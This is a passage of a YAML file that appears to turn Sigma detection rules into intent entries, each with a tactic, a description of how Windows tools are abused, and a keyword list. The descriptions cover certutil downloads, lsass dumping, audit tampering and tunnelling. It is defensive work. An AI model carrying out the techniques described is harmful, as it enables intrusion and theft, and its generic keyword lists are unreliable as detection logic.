    any binary named "powershell.exe" located in the path provided by 6th positional
    argument
  conditions:
    summary:
      regex_any:
      - suspicious
      - agentexecutor
      - powershell
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9c7e131a_0f2c_4ae0_9d43_b04f4e266d43
  intent: execution
  tactic: execution
  description: 'Detects uncommon child processes of Appvlp.EXE

    Appvlp or the Application Virtualization Utility is included with Microsoft Office.
    Attackers are able to abuse "AppVLP" to execute shell commands.

    Normally, this binary is used for Application Virtualization, but it can also
    be abused to circumvent the ASR file path rule folder

    or to mark a file as a system file.

    '
  conditions:
    summary:
      regex_any:
      - uncommon
      - child
      - process
      - appvlp
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a01b8329_5953_4f73_ae2d_aa01e1f35f00
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of "aspnet_compiler.exe" which can be abused to compile
    and execute C# code.
  conditions:
    summary:
      regex_any:
      - aspnetcompiler
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9ccba514_7cb6_4c5c_b377_700758f2f120
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potentially suspicious child processes of "aspnet_compiler.exe".
  conditions:
    summary:
      regex_any:
      - suspicious
      - child
      - process
      - aspnetcompiler
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9f50fe98_fe5c_4a2d_86c7_fad7f63ed622
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of "aspnet_compiler.exe" with potentially suspicious
    paths for compilation.
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - compilation
      - aspnetcompiler
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f24bcaea_0cd1_11eb_adc1_0242ac120002
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the start of a non built-in assistive technology applications
    via "Atbroker.EXE".
  conditions:
    summary:
      regex_any:
      - uncommon
      - assistive
      - technology
      - applications
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4281cb20_2994_4580_aa63_c8b86d019934
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects usage of attrib.exe to hide files from users.
  conditions:
    summary:
      regex_any:
      - hiding
      - files
      - with
      - attrib
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_efec536f_72e8_4656_8960_5e85d091345b
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the usage of attrib with the "+s" option to set scripts or
    executables located in suspicious locations as system files to hide them from
    users and make them unable to be deleted with simple rights. The rule limits the
    search to specific extensions and directories to avoid FPs

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - files
      - system
      - files
      - using
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_60fc936d_2eb0_4543_8a13_911c750a1dfc
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects an interactive AT job, which may be used as a form of privilege
    escalation.
  conditions:
    summary:
      regex_any:
      - interactive
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c6c56ada_612b_42d1_9a29_adad3c5c2c1e
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Threat actors can use an older version of the auditpol binary available
    inside the NT resource kit to change audit policy configuration to impair detection
    capability.

    This can be carried out by selectively disabling/removing certain audit policies
    as well as restoring a custom policy owned by the threat actor.

    '
  conditions:
    summary:
      regex_any:
      - audit
      - policy
      - tampering
      - resource
      - auditpol
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0a13e132_651d_11eb_ae93_0242ac130002
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Threat actors can use auditpol binary to change audit policy configuration
    to impair detection capability.

    This can be carried out by selectively disabling/removing certain audit policies
    as well as restoring a custom policy owned by the threat actor.

    '
  conditions:
    summary:
      regex_any:
      - audit
      - policy
      - tampering
      - auditpol
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c80e66d8_1780_48a9_b412_46663fd21ac0
  intent: persistence_installation
  tactic: persistence
  description: 'Detects suspicious activity where the WMIC process is used to create
    an autorun registry entry via reg.exe, which is often indicative of persistence
    mechanisms employed by malware.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - autorun
      - registry
      - modified
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9f38c1db_e2ae_40bf_81d0_5b68f73fb512
  intent: lateral_movement
  tactic: lateral_movement
  description: 'Detects the execution of the BitLocker Access Agent Update Utility
    (baaupdate.exe) which is not a common parent process for other processes.

    Suspicious child processes spawned by baaupdate.exe could indicate an attempt
    at lateral movement via BitLocker DCOM & COM Hijacking.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - bitlocker
      - access
      - agent
      - update
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5edc2273_c26f_406c_83f3_f4d948e740dd
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects execution of Microsoft bash launcher with the "-c" flag.

    This can be used to potentially bypass defenses and execute Linux or Windows-based
    binaries directly via bash.

    '
  conditions:
    summary:
      regex_any:
      - indirect
      - inline
      - command
      - execution
      - bash
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2d22a514_e024_4428_9dba_41505bd63a5b
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects execution of Microsoft bash launcher without any flags to
    execute the content of a bash script directly.

    This can be used to potentially bypass defenses and execute Linux or Windows-based
    binaries directly via bash.

    '
  conditions:
    summary:
      regex_any:
      - indirect
      - command
      - execution
      - from
      - script
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1444443e_6757_43e4_9ea4_c8fc705f79a2
  intent: impact_operations
  tactic: impact
  description: Detects the use of the bcdedit command to tamper with the boot configuration
    data. This technique is often times used by malware or attackers as a destructive
    way before launching ransomware.
  conditions:
    summary:
      regex_any:
      - boot
      - configuration
      - tampering
      - bcdedit
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c9fbe8e9_119d_40a6_9b59_dd58a5d84429
  intent: persistence_installation
  tactic: persistence
  description: Detects potential malicious and unauthorized usage of bcdedit.exe
  conditions:
    summary:
      regex_any:
      - potential
      - ransomware
      - unauthorized
      - tampering
      - bcdedit
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c615d676_f655_46b9_b913_78729021e5d7
  intent: data_exfiltration
  tactic: exfiltration
  description: 'Detects the execution of the BCP utility in order to export data from
    the database.

    Attackers were seen saving their malware to a database column or table and then
    later extracting it via "bcp.exe" into a file.

    '
  conditions:
    summary:
      regex_any:
      - data
      - export
      - from
      - mssql
      - table
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_811f459f_9231_45d4_959a_0266c6311987
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious child processes of "BgInfo.exe" which could be a
    sign of potential abuse of the binary to proxy execution via external VBScript
  conditions:
    summary:
      regex_any:
      - suspicious
      - child
      - process
      - bginfo
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_aaf46cdc_934e_4284_b329_34aa701e3771
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects uncommon child processes of "BgInfo.exe" which could be a sign
    of potential abuse of the binary to proxy execution via external VBScript
  conditions:
    summary:
      regex_any:
      - uncommon
      - child
      - process
      - bginfo
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d059842b_6b9d_4ed1_b5c3_5b89143c6ede
  intent: unknown
  tactic: s0190
  description: Detects usage of bitsadmin downloading a file
  conditions:
    summary:
      regex_any:
      - file
      - download
      - bitsadmin
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_99c840f2_2012_46fd_9141_c761987550ef
  intent: unknown
  tactic: s0190
  description: Detects usage of bitsadmin downloading a file using an URL that contains
    an IP
  conditions:
    summary:
      regex_any:
      - suspicious
      - download
      - from
      - direct
      - bitsadmin
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8518ed3d_f7c9_4601_a26c_f361a4256a0c
  intent: unknown
  tactic: s0190
  description: Detects usage of bitsadmin downloading a file from a suspicious domain
  conditions:
    summary:
      regex_any:
      - suspicious
      - download
      - from
      - file
      - sharing
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5b80a791_ad9b_4b75_bcc1_ad4e1e89c200
  intent: unknown
  tactic: s0190
  description: Detects usage of bitsadmin downloading a file with a suspicious extension
  conditions:
    summary:
      regex_any:
      - file
      - with
      - suspicious
      - extension
      - downloaded
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2ddef153_167b_4e89_86b6_757a9e65dcac
  intent: unknown
  tactic: s0190
  description: Detects usage of bitsadmin downloading a file to a suspicious target
    folder
  conditions:
    summary:
      regex_any:
      - file
      - download
      - bitsadmin
      - suspicious
      - target
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6e30c82f_a9f8_4aab_b79c_7c12bce6f248
  intent: unknown
  tactic: s0190
  description: Detects usage of bitsadmin downloading a file to uncommon target folder
  conditions:
    summary:
      regex_any:
      - file
      - download
      - bitsadmin
      - uncommon
      - target
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b9cbbc17_d00d_4e3d_a827_b06d03d2380d
  intent: defense_evasion
  tactic: defense_evasion
  description: 'BITS will allow you to schedule a command to execute after a successful
    download to notify you that the job is finished.

    When the job runs on the system the command specified in the BITS job will be
    executed.

    This can be abused by actors to create a backdoor within the system and for persistence.

    It will be chained in a BITS job to schedule the download of malware/additional
    binaries and execute the program after being downloaded.

    '
  conditions:
    summary:
      regex_any:
      - monitoring
      - persistence
      - bits
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3e8207c5_fcd2_4ea6_9418_15d45b4890e4
  intent: data_staging
  tactic: collection
  description: Detects chromium based browsers starting in headless and debugging
    mode and pointing to a user profile. This could be a sign of data stealing or
    remote control
  conditions:
    summary:
      regex_any:
      - potential
      - data
      - stealing
      - chromium
      - headless
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0e8cfe08_02c9_4815_a2f8_0d157b7ed33e
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects execution of chromium based browser in headless mode using
    the "dump-dom" command line to download files
  conditions:
    summary:
      regex_any:
      - file
      - download
      - with
      - headless
      - browser
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_88d6e60c_759d_4ac1_a447_c0f1466c2d21
  intent: persistence_installation
  tactic: persistence
  description: Detects a Chromium based browser process with the 'load-extension'
    flag to start a instance with a custom extension
  conditions:
    summary:
      regex_any:
      - chromium
      - browser
      - instance
      - executed
      - with
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1c526788_0abe_4713_862f_b520da5e5316
  intent: execution
  tactic: execution
  description: Detects the execution of a Chromium based browser process with the
    "headless" flag and a URL pointing to the mockbin.org service (which can be used
    to exfiltrate data).
  conditions:
    summary:
      regex_any:
      - chromium
      - browser
      - headless
      - execution
      - mockbin
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_27ba3207_dd30_4812_abbf_5d20c57d474e
  intent: persistence_installation
  tactic: persistence
  description: Detects a suspicious process spawning a Chromium based browser process
    with the 'load-extension' flag to start an instance with a custom extension
  conditions:
    summary:
      regex_any:
      - suspicious
      - chromium
      - browser
      - instance
      - executed
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_94771a71_ba41_4b6e_a757_b531372eaab6
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects execution of a browser process with a URL argument pointing
    to a file with a potentially interesting extension. This can be abused to download
    arbitrary files or to hide from the user for example by launching the browser
    in a minimized state.
  conditions:
    summary:
      regex_any:
      - file
      - download
      - from
      - browser
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b3d34dc5_2efd_4ae3_845f_8ec14921f449
  intent: data_staging
  tactic: collection
  description: Detects browsers starting with the remote debugging flags. Which is
    a technique often used to perform browser injection attacks
  conditions:
    summary:
      regex_any:
      - browser
      - started
      - with
      - remote
      - debugging
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_62f7c9bf_9135_49b2_8aeb_1e54a6ecc13c
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the use of Tor or Tor-Browser to connect to onion routing networks
  conditions:
    summary:
      regex_any:
      - client
      - browser
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_737e618a_a410_49b5_bec3_9e55ff7fbc15
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects suspicious use of ''calc.exe'' with command line parameters
    or in a suspicious directory, which is likely caused by some PoC or detection
    evasion.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - calculator
      - usage
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b5c7395f_e501_4a08_94d4_57fe7a9da9d2
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects usage of "cdb.exe" to launch arbitrary processes or commands
    from a debugger script file
  conditions:
    summary:
      regex_any:
      - potential
      - binary
      - proxy
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ff992eac_6449_4c60_8c1d_91c9722a1d48
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects execution of "certmgr" with the "add" flag in order to install
    a new certificate on the system.

    Adversaries may install a root certificate on a compromised system to avoid warnings
    when connecting to adversary controlled web servers.

    '
  conditions:
    summary:
      regex_any:
      - root
      - certificate
      - installed
      - certmgr
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_70ad0861_d1fe_491c_a45f_fa48148a300d
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects when a user downloads a file by using CertOC.exe
  conditions:
    summary:
      regex_any:
      - file
      - download
      - certoc
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b86f6dea_0b2f_41f5_bdcc_a057bd19cd6a
  intent: execution
  tactic: execution
  description: Detects when a user downloads a file from an IP based URL using CertOC.exe
  conditions:
    summary:
      regex_any:
      - file
      - download
      - from
      - based
      - certoc
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_242301bc_f92f_4476_8718_78004a6efd9f
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects when a user installs certificates by using CertOC.exe to loads
    the target DLL file.
  conditions:
    summary:
      regex_any:
      - loaded
      - certoc
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_84232095_ecca_4015_b0d7_7726507ee793
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects when a user installs certificates by using CertOC.exe to load
    the target DLL file.
  conditions:
    summary:
      regex_any:
      - suspicious
      - loaded
      - certoc
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d2125259_ddea_4c1c_9c22_977eb5b29cf0
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects execution of "certutil" with the "addstore" flag in order
    to install a new certificate on the system.

    Adversaries may install a root certificate on a compromised system to avoid warnings
    when connecting to adversary controlled web servers.

    '
  conditions:
    summary:
      regex_any:
      - root
      - certificate
      - installed
      - certutil
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cc9cbe82_7bc0_4ef5_bc23_bbfb83947be7
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of certutil with either the "decode" or "decodehex"
    flags to decode base64 or hex encoded files. This can be abused by attackers to
    decode an encoded payload before execution
  conditions:
    summary:
      regex_any:
      - file
      - decoded
      - from
      - base64
      - certutil
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_19b08b1c_861d_4e75_a1ef_ea0c1baf202b
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of certutil with certain flags that allow the
    utility to download files.
  conditions:
    summary:
      regex_any:
      - suspicious
      - download
      - certutil
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_13e6fe51_d478_4c7e_b0f2_6da9b400a829
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of certutil with certain flags that allow the
    utility to download files from direct IPs.
  conditions:
    summary:
      regex_any:
      - suspicious
      - file
      - downloaded
      - from
      - direct
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_42a5f1e7_9603_4f6d_97ae_3f37d130d794
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of certutil with certain flags that allow the
    utility to download files from file-sharing websites.
  conditions:
    summary:
      regex_any:
      - suspicious
      - file
      - downloaded
      - from
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e62a9f0c_ca1e_46b2_85d5_a6da77f86d1a
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of certutil with the "encode" flag to encode
    a file to base64. This can be abused by threat actors and attackers for data exfiltration
  conditions:
    summary:
      regex_any:
      - file
      - encoded
      - base64
      - certutil
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ea0cdc3e_2239_4f26_a947_4e8f8224e464
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of certutil with the "encode" flag to encode
    a file to base64 where the extensions of the file is suspicious
  conditions:
    summary:
      regex_any:
      - suspicious
      - file
      - encoded
      - base64
      - certutil
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_82a6714f_4899_4f16_9c1e_9a333544d4c3
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of certutil with the "encode" flag to encode
    a file to base64 where the files are located in potentially suspicious locations
  conditions:
    summary:
      regex_any:
      - file
      - suspicious
      - location
      - encoded
      - base64
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3ffd6f51_e6c1_47b7_94b4_c1e61d4117c5
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of the certutil with the "exportPFX" flag which
    allows the utility to export certificates.
  conditions:
    summary:
      regex_any:
      - certificate
      - exported
      - certutil
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6c6d9280_e6d0_4b9d_80ac_254701b64916
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects possible NTLM coercion via certutil using the 'syncwithWU'
    flag
  conditions:
    summary:
      regex_any:
      - potential
      - ntlm
      - coercion
      - certutil
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7090adee_82e2_4269_bd59_80691e7c6338
  intent: reconnaissance
  tactic: discovery
  description: Detects use of chcp to look up the system locale value as part of host
    discovery
  conditions:
    summary:
      regex_any:
      - console
      - codepage
      - lookup
      - chcp
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c7942406_33dd_4377_a564_0f62db0593a3
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects a code page switch in command line or batch scripts to a rare
    language
  conditions:
    summary:
      regex_any:
      - suspicious
      - codepage
      - switch
      - chcp
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4b046706_5789_4673_b111_66f25fe99534
  intent: impact_operations
  tactic: impact
  description: 'Detects usage of the "cipher" built-in utility in order to overwrite
    deleted data from disk.

    Adversaries may destroy data and files on specific systems or in large numbers
    on a network to interrupt availability to systems, services, and network resources.

    Data destruction is likely to render stored data irrecoverable by forensic techniques
    through overwriting files or data on local and remote drives

    '
  conditions:
    summary:
      regex_any:
      - deleted
      - data
      - overwritten
      - cipher
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4c0aaedc_154c_4427_ada0_d80ef9c9deb6
  intent: credential_harvesting
  tactic: credential_access
  description: Detects a possible process memory dump that uses the white-listed Citrix
    TrolleyExpress.exe filename as a way to dump the lsass process memory
  conditions:
    summary:
      regex_any:
      - process
      - access
      - trolleyexpress
      - exclusion
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fadb84f0_4e84_4f6d_a1ce_9ef2bffb6ccd
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects the execution of the "cloudflared" binary from a non standard
    location.

    '
  conditions:
    summary:
      regex_any:
      - cloudflared
      - portable
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_222129f7_f4dc_4568_b0d2_22440a9639ba
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects creation of an ad-hoc Cloudflare Quick Tunnel, which can be
    used to tunnel local services such as HTTP, RDP, SSH and SMB.

    The free TryCloudflare Quick Tunnel will generate a random subdomain on trycloudflare[.]com,
    following a call to api[.]trycloudflare[.]com.

    The tool has been observed in use by threat groups including Akira ransomware.

    '
  conditions:
    summary:
      regex_any:
      - cloudflared
      - quick
      - tunnel
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7050bba1_1aed_454e_8f73_3f46f09ce56a
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects execution of the "cloudflared" tool with the tunnel "cleanup"
    flag in order to cleanup tunnel connections.
  conditions:
    summary:
      regex_any:
      - cloudflared
      - tunnel
      - connections
      - cleanup
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9a019ffc_3580_4c9d_8d87_079f7e8d3fd4
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects execution of the "cloudflared" tool to connect back to a tunnel.
    This was seen used by threat actors to maintain persistence and remote access
    to compromised networks.
  conditions:
    summary:
      regex_any:
      - cloudflared
      - tunnel
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b1ec66c6_f4d1_4b5c_96dd_af28ccae7727
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects usage of "cmdkey.exe" to add generic credentials.

    As an example, this can be used before connecting to an RDP session via command
    line interface.

    '
  conditions:
    summary:
      regex_any:
      - generic
      - credentials
      - added
      - cmdkey
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_07f8bdc2_c9b3_472a_9817_5a670b872f53
  intent: credential_harvesting
  tactic: credential_access
  description: Detects usage of cmdkey to look for cached credentials on the system
  conditions:
    summary:
      regex_any:
      - potential
      - reconnaissance
      - cached
      - credentials
      - cmdkey
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f37aba28_a9e6_4045_882c_d5004043b337
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects execution of Cmdl32 with the "/vpn" and "/lan" flags.

    Attackers can abuse this utility in order to download arbitrary files via a configuration
    file.

    Inspect the location and the content of the file passed as an argument in order
    to determine if it is suspicious.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - arbitrary
      - file
      - download
      - cmdl32
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ae6f14e6_14de_45b0_9f44_c0986f50dc89
  intent: persistence_installation
  tactic: persistence
  description: 'Detects when a program changes the default file association of any
    extension to an executable.

    When a file is opened, the default program used to open the file (also called
    the file association or handler) is checked. File association selections are stored
    in the Windows Registry and can be edited by users, administrators, or programs
    that have Registry access or by administrators using the built-in assoc utility.
    Applications can modify the file association for a given file extension to call
    an arbitrary program when a file with the given extension is opened.

    '
  conditions:
    summary:
      regex_any:
      - change
      - default
      - file
      - association
      - executable
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_044ba588_dff4_4918_9808_3f95e8160606
  intent: credential_harvesting
  tactic: credential_access
  description: Detects usage of the copy builtin cmd command to copy files with the
    ".dmp"/".dump" extension from a remote share
  conditions:
    summary:
      regex_any:
      - copy
      - dump
      - files
      - from
      - remote
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_21dd6d38_2b18_4453_9404_a0fe4a0cc288
  intent: command_and_control_setup
  tactic: command_and_control
  description: Adversaries can use curl to download payloads remotely and execute
    them. Curl is included by default in Windows 10 build 17063 and later.
  conditions:
    summary:
      regex_any:
      - curl
      - download
      - execute
      - combination
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_204b17ae_4007_471b_917b_b917b315c5db
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of the "del" builtin command to remove files using
    greedy/wildcard expression. This is often used by malware to delete content of
    folders that perhaps contains the initial malware infection or to delete evidence.
  conditions:
    summary:
      regex_any:
      - greedy
      - file
      - deletion
      - using
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a77c1610_fc73_4019_8e29_0f51efc04a51
  intent: execution
  tactic: execution
  description: Detects possible payload obfuscation via the commandline
  conditions:
    summary:
      regex_any:
      - potential
      - dosfuscation
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1ac8666b_046f_4201_8aba_1951aaec03a3
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects a suspicious command line execution that includes an URL and
    AppData string in the command line parameters as used by several droppers (js/vbs
    > powershell)
  conditions:
    summary:
      regex_any:
      - command
      - line
      - execution
      - with
      - suspicious
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e9b61244_893f_427c_b287_3e708f321c6b
  intent: persistence_installation
  tactic: persistence
  description: Detects the creation of a symbolic link between "cmd.exe" and the accessibility
    on-screen keyboard binary (osk.exe) using "mklink". This technique provides an
    elevated command prompt to the user from the login screen without the need to
    log in.
  conditions:
    summary:
      regex_any:
      - potential
      - privilege
      - escalation
      - using
      - symlink
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_40b19fa6_d835_400c_b301_41f3a2baacaf
  intent: credential_harvesting
  tactic: credential_access
  description: Shadow Copies storage symbolic link creation using operating systems
    utilities
  conditions:
    summary:
      regex_any:
      - volumeshadowcopy
      - symlink
      - creation
      - mklink
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f0507c0f_a3a2_40f5_acc6_7f543c334993
  intent: execution
  tactic: execution
  description: Detects the execution of the "net use" command to mount a WebDAV server
    and then immediately execute some content in it. As seen being used in malicious
    LNK files
  conditions:
    summary:
      regex_any:
      - suspicious
      - file
      - execution
      - from
      - internet
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a16980c2_0c56_4de0_9a79_17971979efdd
  intent: execution
  tactic: execution
  description: 'Detects Windows command lines that miss a space before or after the
    /c flag when running a command using the cmd.exe.

    This could be a sign of obfuscation of a fat finger problem (typo by the developer).

    '
  conditions:
    summary:
      regex_any:
      - missing
      - space
      - characters
      - execution
      - anomaly
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bbc865e4_7fcd_45a6_8ff1_95ced28ec5b2
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects command that type the content of ntdll.dll to a different file
    or a pipe in order to evade AV / EDR detection. As seen being used in the POC
    NtdllPipe
  conditions:
    summary:
      regex_any:
      - ntdllpipe
      - like
      - activity
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_087790e3_3287_436c_bccf_cbd0184a7db1
  intent: execution
  tactic: execution
  description: Detects potential path traversal attempt via cmd.exe. Could indicate
    possible command/argument confusion/hijacking
  conditions:
    summary:
      regex_any:
      - potential
      - commandline
      - path
      - traversal
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ded2b07a_d12f_4284_9b76_653e37b6c8b0
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects uncommon and potentially suspicious one-liner command containing
    both "ping" and "copy" at the same time, which is usually used by malware.

    '
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - ping
      - copy
      - command
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_54786ddc_5b8a_11ed_9b6a_0242ac120002
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects a method often used by ransomware. Which combines the "ping"
    to wait a couple of seconds and then "del" to delete the file in question. Its
    used to hide the file responsible for the initial infection for example
  conditions:
    summary:
      regex_any:
      - suspicious
      - ping
      - command
      - combination
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8e0bb260_d4b2_4fff_bb8d_3f82118e6892
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects inline Windows shell commands redirecting output via the ">"
    symbol to a suspicious location.

